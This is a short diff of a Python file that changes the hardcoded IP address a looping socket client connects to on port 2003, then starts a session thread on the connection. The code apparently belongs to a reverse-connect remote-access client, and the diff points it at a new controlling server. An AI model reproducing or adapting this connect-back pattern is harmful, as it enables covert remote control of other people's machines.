@@ -170,7 +170,7 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("157.230.227.120",2003))
+            s.connect(("159.65.11.28",2003))
             #print("Connected")
             conn_process = Thread(target=start_session,args=(s,))
             conn_process.start()
